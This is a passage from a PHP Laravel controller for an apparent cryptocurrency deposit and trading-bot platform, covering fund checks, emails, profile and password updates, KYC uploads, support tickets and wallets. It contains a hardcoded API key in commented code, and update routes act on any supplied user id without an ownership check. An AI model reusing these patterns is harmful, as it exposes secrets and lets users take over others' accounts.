                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Smaller than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }elseif(($amount) > $basic->eth_max)
            {
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Larger than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }else{
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-success"><i class="fa fa-check"></i> Well Done. Fund This Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="submit" class="btn btn-info"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }
        }
        elseif($type == 7){
            if(($amount) < $basic->usdt_min){
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Smaller than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }elseif(($amount) > $basic->usdt_max)
            {
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Larger than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }else{
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-success"><i class="fa fa-check"></i> Well Done. Fund This Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="submit" class="btn btn-info"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }
        }
        elseif($type == 8){
            if(($amount) < $basic->usdd_min){
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Smaller than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }elseif(($amount) > $basic->usdd_max)
            {
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Larger than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }else{
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-success"><i class="fa fa-check"></i> Well Done. Fund This Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="submit" class="btn btn-info"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }
        }
        elseif($type == 9){
            if(($amount) < $basic->doge_min){
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Smaller than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }elseif(($amount) > $basic->doge_max)
            {
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Larger than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }else{
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-success"><i class="fa fa-check"></i> Well Done. Fund This Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="submit" class="btn btn-info"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }
        }
        elseif($type == 10){
            if(($amount) < $basic->stellar_min){
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Smaller than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }elseif(($amount) > $basic->stellar_max)
            {
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Larger than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }else{
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-success"><i class="fa fa-check"></i> Well Done. Fund This Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="submit" class="btn btn-info"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }
        }elseif($type == 11){
            if(($amount) < $basic->busd_min){
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Smaller than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }elseif(($amount) > $basic->busd_max)
            {
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Larger than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }else{
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-success"><i class="fa fa-check"></i> Well Done. Fund This Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="submit" class="btn btn-info"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }
        }
    }

    public function sendFundingEmail($transaction)
    {
        $fund = FundLog::whereTransaction_id($transaction)->first();
        $user = User::findorfail(Auth::user()->id);
        $gene = GeneralSetting::first();
        $mail_val2 = [
            'g_email' => $gene->email,
            'g_title' => 'Wallet Funding Notification',
            'subject' => 'Wallet Funding Notification.',
            'receiver' => $user->email,
        ];
        Config::set('mail.driver','mail');
        Config::set('mail.from',$gene->email);
        Config::set('mail.name','Wallet Funding Notice');
        Mail::send('emails.wallet-funding', ['orderfrom' =>$user->name, 'amount' => $fund->amount, 'acc' => $fund->btc_acc, 'trans_id' => $fund->transaction_id, 'site_title'=>$gene->title,'site_footer'=>$gene->title], function ($m) use ($mail_val2) {
            $m->from($mail_val2['g_email'], $mail_val2['g_title']);
            $m->to($mail_val2['receiver'])->subject($mail_val2['subject']);
        });
    }

    public function announcements()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Announcements";
        $data['announcements'] = Announcement::all();
        return view('user.announcements',$data);
    }

    public function markets()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Markets";
        return view('user.market',$data);
    }

    public function pairDetail($id)
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $api = @file_get_contents("https://www.bitstamp.net/api/v2/ticker/$id");
        if(!$api)
        {
            $data['trading_pairs'] = [];
        }else{
            $data['trading_pairs'] = json_decode($api);
        }
        $tra = @file_get_contents("https://www.bitstamp.net/api/v2/transactions/$id");
        if(!$tra)
        {
            $data['transactions'] = [];
        }else{
            $data['transactions'] = json_decode($tra);
        }
        $data['page_title'] = $id;
        return view('user.pair-detail',$data);
    }

    public function repeatTable($id)
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "User Profit Table";
        $data['repeat'] = RebeatLog::whereDeposit_id($id)->whereUser_id(Auth::user()->id)->orderBy('id','ASC')->get();
        $data['repeatamount'] = RebeatLog::whereDeposit_id($id)->whereUser_id(Auth::user()->id)->sum('balance');
        $data['dep'] = Deposit::findorfail($id);
        return view('user.repeat-table',$data);
    }

    public function referenceUser()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Referrals";
        $data['user'] = User::whereUnder_reference(Auth::user()->reference)->orderBy('id','desc')->get();
        $data['bonus'] = Reference::whereUser_id(Auth::user()->id)->sum('balance');
        $data['balance'] = UserReferral::whereUser_id(Auth::user()->id)->sum('balance');
        $data['pay'] = UserWallet::whereuser_id(Auth::user()->id)->get();
        return view('user.reference-user',$data);
    }

    public function referenceHistory()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Reference History";
        $data['bonus'] = Reference::whereUser_id(Auth::user()->id)->orderBy('id','desc')->get();
        return view('user.reference-history',$data);
    }

    public function userActivity()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "User All Activity";
        $data['activity'] = UserBalance::whereUser_id(Auth::user()->id)->orderBy('id','desc')->get();
        return view('user.user-activity',$data);
    }

    public function editUser()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "User Details Update ";
        $data['member'] = User::findOrFail(Auth::user()->id);
        return view('user.user-edit',$data);
    }

    public function updateUser(Request $request,$id)
    {

        /*dd($request);*/
        $this->validate($request,[
            'name' => 'required',
            'phone' => 'required',
            'address' => 'required',
            'country' => 'required',
            'zip' => 'required',
            'image' => 'mimes:jpg,png,jpeg',
        ]);
        $us = $request->except('_method','_token','email');
        if($request->hasFile('image')){
            $image = $request->file('image');
            $filename = time().'.'.$image->getClientOriginalExtension();
            $location = 'assets/images/' . $filename;
            Image::make($image)->resize(450,600)->save($location);
            $us['image'] = $filename;
        }
        $user = User::findOrFail($id);
        $user->fill($us)->save();
        session()->flash('message', 'User Updated Successfully.');
        Session::flash('type', 'success');
        Session::flash('title', 'success');
        return redirect()->route('user-dashboard');
    }

    public function userPassword()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Settings ";
        $data['member'] = User::findOrFail(Auth::user()->id);
        return view('user.user-password',$data);
    }

    public function updatePassword(Request $request,$id)
    {

        $this->validate($request, [
            'current_password' =>'required',
            'password' => 'required|min:6|confirmed'
        ]);
        try {
            $c_password = Auth::user()->password;
            $user = User::findOrFail($id);

            if(Hash::check($request->current_password, $c_password)){

                $password = Hash::make($request->password);
                $user->password = $password;
                $user->save();
                session()->flash('message', 'Password Changes Successfully.');
                Session::flash('type', 'success');
                Session::flash('title', 'success');
                return redirect()->back();
            }else{
                session()->flash('message', 'Password Not Match');
                Session::flash('type', 'warning');
                Session::flash('title', 'Opps..!');
                return redirect()->back();
            }

        } catch (\PDOException $e) {
            session()->flash('message', 'Some Problem Occurs, Please Try Again!');
            Session::flash('type', 'warning');
            return redirect()->back();
        }
    }

    public function autoDeposit(Request $request)
    {

        $amount = $request->amount;
        $plan_id = $request->plan_id;
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "User Deposit Preview";
        $data['payment'] = Payment::first();
        $data['plan'] = Plan::findOrFail($plan_id);
        $data['amount'] = $amount;
        if (Auth::user()->amount < $amount){
            $data['hit'] = 1;
        }else{
            $data['hit'] = 0;
        }
        return view('user.deposit-auto-preview',$data);
    }

    public function manualFundAdd()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Fund Add via Bank";
        $data['bank'] = ManualBank::whereStatus(1)->get();
        return view('bank.manual-fund',$data);
    }

    public function fundAddCheck(Request $request)
    {

        $amount = $request->amount;
        $method = $request->method_id;
        $bank = ManualBank::findOrFail($method);

        if ($request->amount < $bank->minimum or $request->amount > $bank->maximum)
        {
            return '<div class="col-md-12 col-sm-offset-4">
                <div class="alert alert-warning"><i class="fa fa-times"></i> Sorry You can\'t Add This Fund.</div>
            </div>
            <div class="col-md-12 col-sm-offset-4">
                <button type="button" class="btn btn-info btn-block btn-icon btn-lg icon-left delete_button disabled"
                        >
                    <i class="fa fa-send"></i> Deposit Fund
                </button>
            </div>';
        }
        else{
            return '<div class="col-md-12 col-sm-offset-4">
                <div class="alert alert-success"><i class="fa fa-check"></i> Well Done. You Can add This Fund.</div>
            </div>
            <div class="col-md-12 col-sm-offset-4">
                <button type="submit" class="btn btn-info btn-block btn-icon btn-lg icon-left delete_button"
                        data-toggle="modal" data-target="#DelModal"
                        data-id='.$amount.'>
                    <i class="fa fa-send"></i> Deposit Fund
                </button>
            </div>';
        }
    }

    public function StoreManualFundAdd(Request $request)
    {
        $mu['amount'] = $request->amount;
        $mu['bank_id'] = $request->method_id;
        $mu['user_id'] = Auth::user()->id;
        $mu['transaction_id'] = date('ymd').Str::random(6).rand(11,99);
        $bank = ManualBank::findOrFail($request->method_id);
        $mu['charge'] = $bank->fix + (($request->amount * $bank->percent ) / 100);
        $mu['total'] = $request->amount + $mu['charge'];
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Bank Fund Add Preview";
        $data['fund'] = ManualFundLog::create($mu);
        $data['method'] = $bank;
        return view('bank.manual-fund-preview',$data);
    }

    public function submitManualFund(Request $request)
    {

        $mu['manual_fund_log_id'] = $request->log_id;
        $mu['message'] = $request->message;
        $am = ManualFundLog::findOrFail($request->log_id);
        $mu['amount'] = $am->amount;
        $mu['user_id'] = Auth::user()->id;
        $ad = ManualFund::create($mu);
        if($request->hasFile('image')){
            $image3 = $request->file('image');
            foreach ($image3 as $i)
            {
                $filename3 = time().uniqid().'.'.$i->getClientOriginalExtension();
                $location = 'assets/upload/' . $filename3;
                Image::make($i)->save($location);
                $image['image'] = $filename3;
                $image['fund_id'] = $ad->id;
                Photo::create($image);
            }
        }
        session()->flash('message', 'Bank Fund Request Successfully Completed.');
        Session::flash('title', 'Success');
        Session::flash('type', 'success');
        return redirect()->back();

    }

    public function manualFundHistory()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Bank Fund Add History";
        $data['fund'] = ManualFund::whereUser_id(Auth::user()->id)->orderBy('id','desc')->get();
        return view('bank.manual-fund-history',$data);
    }

    public function manualFundAddDetails($id)
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Bank Payment Request";
        $data['fund'] = ManualFund::findOrFail($id);
        $data['img'] = Photo::whereFund_id($id)->get();
        return view('bank.manual-payment-request-view',$data);
    }

    public function getPrograms()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Robots";
        $data['payment'] = Payment::first();
        $data['plan'] = Plan::whereStatus(1)->whereplan_type_id(1)->get();
        $data['forex'] = Plan::whereStatus(1)->whereplan_type_id(2)->get();
        return view('user.programs',$data);
    }

    public function getKYC()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "KYC";
        $data['payment'] = Payment::first();
        $data['member'] = User::findOrFail(Auth::user()->id);
        return view('user.kyc',$data);
    }

    public function submitKYC(Request $request)
    {
        $this->validate($request,[
            'front_id' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
            'back_id' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
        ]);

        if($request->hasFile('front_id') || $request->hasFile('back_id'))
        {
            $user = User::findOrFail(Auth::user()->id);
            if ($image = $request->file('front_id'))
            {
                $destinationPath = 'assets/images/';
                $profileImage1 = date('YmdHis') ."1". ".". $image->getClientOriginalExtension();
                $image->move($destinationPath, $profileImage1);
                $user->passport_image = "$profileImage1";
            }
            if ($image = $request->file('back_id'))
            {
                $destinationPath = 'assets/images/';
                $profileImage2 = date('YmdHis') ."2". ".". $image->getClientOriginalExtension();
                $image->move($destinationPath, $profileImage2);
                $user->utility_bill_image = "$profileImage2";
            }
            $upload = $user->update();
            if($upload)
            {
                session()->flash('message', 'Documents Uploaded Successfully');
                Session::flash('type', 'success');
                Session::flash('title', 'success');
                return response()->json('User Documents uploaded successfully');
            }
            else
            {
                return response()->json('An Error Occurred. Check Image Size and Try Again');
            }
        }
        else
        {
            session()->flash('message', 'An Error Occurred. Select Image and Try Again');
            Session::flash('type', 'danger');
            Session::flash('title', 'danger');
            return redirect()->route('user-kyc');
        }
    }

    public function verifyPayment($id)
    {
        $payee = User::findorfail(Auth::user()->id);
        $log = FundLog::wheretransaction_id($id)->wherestatus(0)->first();
        $gene = GeneralSetting::first();
        $mail_val2 = [
            'g_email' => $gene->email,
            'g_title' => 'Payment Completion Notification',
            'subject' => 'Payment Completion Notification.',
            'receiver' => 'admin@'.$gene->title,
        ];
        Config::set('mail.driver','mail');
        Config::set('mail.from',$gene->email);
        Config::set('mail.name','Payment Completion Notice');
        Mail::send('emails.payment-completion-notice', ['orderfrom' =>$payee->name, 'amount' => $log->amount, 'acc' => $log->crypto_wallet, 'trans_id' => $log->transaction_id, 'site_title'=>$gene->title,'site_footer'=>$gene->title], function ($m) use ($mail_val2) {
            $m->from($mail_val2['g_email'], $mail_val2['g_title']);
            $m->to($mail_val2['receiver'])->subject($mail_val2['subject']);
        });
        session()->flash('message', 'Payment received Successfully, please wait while verification completes.');
        Session::flash('type', 'success');
        Session::flash('title', 'success');
        return redirect()->route('user-dashboard');
    }

    public function openSupport()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Open Support Ticket";
        return view('user.support-open', $data);
    }

    public function submitSupport(Request $request)
    {
        $this->validate($request,[
            'subject' => 'required',
            'message' => 'required'
        ]);
        $user = Auth::user();
        $s['ticket_number'] = strtoupper(Str::random(12));
        $s['user_id'] = Auth::user()->id;
        $s['subject'] = $request->subject;
        $s['status'] = 1;
        $mm = Support::create($s);
        $mess['support_id'] = $mm->id;
        $mess['ticket_number'] = $mm->ticket_number;
        $mess['message'] = $request->message;
        $mess['type'] = 1;
        SupportMessage::create($mess);

        $general = GeneralSetting::first();
        $mail_val2 = [
            'g_email' => $general->email,
            'g_title' => 'Support Message Notification',
            'subject' => 'Message Notification.',
            'receiver' => 'admin@'.$general->title,
        ];
        Config::set('mail.driver','mail');
        Config::set('mail.from',$general->email);
        Config::set('mail.name','Support Message Notification');
        Mail::send('emails.support-notice', ['name' =>$user->name, 'mess' => $request->message, 'ticket_no' => $mess['ticket_number'], 'email' => $user->email, 'site_title'=>$general->title,'site_footer'=>$general->title], function ($m) use ($mail_val2) {
            $m->from($mail_val2['g_email'], $mail_val2['g_title']);
            $m->to($mail_val2['receiver'])->subject($mail_val2['subject']);
        });
        session()->flash('message', 'Support Ticket Successfully Opened.');
        Session::flash('type', 'success');
        Session::flash('title', 'success');
        return redirect()->route('support-all');
    }

    public function allSupport()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "All Support Ticket";
        $data['support'] = Support::whereUser_id(Auth::user()->id)->orderBy('id','desc')->get();
        return view('user.support-all',$data);
    }

    public function supportMessage($id)
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Support Message";
        $data['support'] = Support::whereTicket_number($id)->first();
        $data['message'] = SupportMessage::whereTicket_number($id)->orderBy('id','asc')->get();
        return view('user.support-message', $data);
    }

    public function userSupportMessage(Request $request)
    {
        $this->validate($request,[
            'message' => 'required',
            'support_id' => 'required'
        ]);
        $mm = Support::findOrFail($request->support_id);
        $mm->status = 3;
        $mm->save();
        $mess['support_id'] = $mm->id;
        $mess['ticket_number'] = $mm->ticket_number;
        $mess['message'] = $request->message;
        $mess['type'] = 1;
        SupportMessage::create($mess);
        session()->flash('message','Support Ticket Successfully Reply.');
        session()->flash('type','success');
        session()->flash('title','success');
        return redirect()->back();
    }

    public function supportClose(Request $request)
    {
        $this->validate($request,[
            'support_id' => 'required'
        ]);
        $su = Support::findOrFail($request->support_id);
        $su->status = 9;
        $su->save();
        session()->flash('message','Support Successfully Closed.');
        session()->flash('type','success');
        session()->flash('title','success');
        return redirect()->back();
    }

    public function topUpDeposit(Request $request)
    {
        $general = GeneralSetting::first();
        $basic = BasicSetting::first();
        $deposit = Deposit::findorfail($request->deposit_id);
        $user = User::findorfail($deposit->user_id);
        $wallet = UserWallet::findorfail($deposit->wallet_id);

        if ($user->amount < $request->amount) {
            session()->flash('message', 'User Wallet Balance lower than Top Up amount, Please fund wallet and continue');
            session()->flash('type', 'error');
            session()->flash('title', 'error');
            return redirect()->back();
        } elseif($wallet->amount_in_usd < $request->amount)
        {
            session()->flash('message', 'User Wallet Balance lower than Top Up amount, Please fund wallet and continue');
            session()->flash('type', 'error');
            session()->flash('title', 'error');
            return redirect()->back();
        }
        else {

            $userbal = new UserBalance();
            $userbal->user_id = $deposit->user_id;
            $userbal->balance_type = '11';
            $userbal->details = "Bot Trading TOPUP ID: # " . $deposit['deposit_number'] . '; ' . "Bot : " . $deposit->plan->name;
            $userbal->balance = $request->amount;
            $userbal->new_balance = $user->amount - $request->amount;
            $userbal->old_balance = $user->amount;
            $userbal->save();

            $user->amount = $user->amount - $request->amount;
            $user->update();

            $wallet->amount_in_usd = $wallet->amount_in_usd - $request->amount;
//            $walname = strtolower(Str::slug($wallet->wallets->name));
//            $api = file_get_contents("https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids={$walname}");
//            $response = json_decode($api);
//            $rate = $response[0]->current_price;
            $rate = $wallet->wallets->crypto_rate;
            $calc = $wallet->amount_in_usd / $rate;
            $calc = round($calc, 6);
            $wallet->amount_in_crypto = $calc;
            $wallet->update();

            $tt = $deposit->amount + $request->amount;

            $mail_val2 = [
                'g_email' => $general->email,
                'g_title' => 'Trading TopUp Notification',
                'subject' => 'TopUp On Trading Notice.',
                'receiver' => $user->email,
            ];
            Config::set('mail.driver', 'mail');
            Config::set('mail.from', $general->email);
            Config::set('mail.name', 'Trading TopUp Notification');
            Mail::send('emails.top-up', ['orderfrom' => $user->name, 'old' => $deposit->amount, 'amount' => $request->amount, 'total' => $tt, 'investment' => $deposit->deposit_number, 'site_title'=>$general->title,'site_footer'=>$general->title], function ($m) use ($mail_val2) {
                $m->from($mail_val2['g_email'], $mail_val2['g_title']);
                $m->to($mail_val2['receiver'])->subject($mail_val2['subject']);
            });

            $deposit->amount = $deposit->amount + $request->amount;
            $deposit->update();
            session()->flash('message', 'Top Up Process Complete.');
            Session::flash('type', 'success');
            Session::flash('title', 'success');
            return redirect()->back();
        }
    }

    public function wallets()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Wallets";
        $data['wallets'] = PaymentWallet::wherestatus(1)->get();
        $data['responsew'] = CryptoWallet::all();
        $data['u_wallets'] = UserWallet::whereuser_id(Auth::user()->id)->wherestatus(1)->get();

//        $url = 'https://pro-api.coinmarketcap.com/v1/cryptocurrency/listings/latest';
//        $parameters = [
//            'start' => '1',
//            'limit' => '20',
//            'convert' => 'USD'
//        ];
//
//        $headers = [
//            'Accepts: application/json',
//            'X-CMC_PRO_API_KEY: ec2c94d8-3abb-41b8-93de-18ac571e443e'
//        ];
//        $qs = http_build_query($parameters);
//        $request = "{$url}?{$qs}";
//
//
//        $curl = curl_init();
//        curl_setopt_array($curl, array(
//            CURLOPT_URL => $request,
//            CURLOPT_HTTPHEADER => $headers,
//            CURLOPT_RETURNTRANSFER => 1
//        ));
//
//        $response = curl_exec($curl);
//        $api = json_decode($response);
//        curl_close($curl);
//        $context = stream_context_create(
//            array(
//                "http" => array(
//                    "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
//                )
//            )
//        );
//
//        if (!$api = @file_get_contents("https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd",false, $context))
//        {
//            $error = error_get_last();
//            $data['responsew'] = [];
//        }else
//        {
//            $data['responsew'] = json_decode($api);
//        }
//
//        $responsew = $data['responsew'];
//        dd($responsew);
        return view('user.wallets', $data);
    }

//    public function walletChart()
//    {
//        $chart = new UserLineChart;
//        $chart->dataset('New User Register Chart', 'line', $users)->options([
//            'fill' => 'true',
//            'borderColor' => '#51C1C0'
//        ]);
//
//        return $chart->api();
//    }
    public function walletDetails($id,$short)
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['check'] = PaymentWallet::whereshort($short)->exists();
        $data['wallet'] = PaymentWallet::whereshort($short)->first();
        $image = $data['wallet']->image ?? '';
        $sh = strtoupper($short);
//        $api = @file_get_contents("https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids={$id}");
//        $api = @file_get_contents("https://api.binance.com/api/v3/ticker?symbol={$sh}USDT");
        $api = CryptoWallet::wheresymbol($short)->first();
//        $api = $this->cryptoRate($id);
//        dd($api);
        if($api && $data['check'])
        {
            $data['rate'] = $api->rate;
            $data['logo'] = $api->image;
//            $data['logo'] = $response[0]->image;
            $data['page_title'] = $data['wallet']->name;
            $data['d'] = "24h";
            $data['dd'] = "30d";
            $data['detail'] = $api;
        }elseif(!$data['check'])
        {
            session()->flash('message', 'Wallet is Unavailable.');
            Session::flash('type', 'danger');
            Session::flash('title', 'Error');
            return redirect()->back();
        }
        else
        {
            $response = [];
            $data['rate'] = $data['wallet']->crypto_rate;
//            $data['logo'] = $response[0]->image;
            $data['logo'] = "../../../assets/images/".$image;
            $data['page_title'] = $data['wallet']->name;
            $data['d'] = "24h";
            $data['dd'] = "30d";
            $data['detail'] = $response;
        }
        return view('user.wallet-detail', $data);
    }

    public function swapCoins()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Swap Coin";
        $data['wallets'] = UserWallet::whereuser_id(Auth::user()->id)->wherestatus(1)->get();
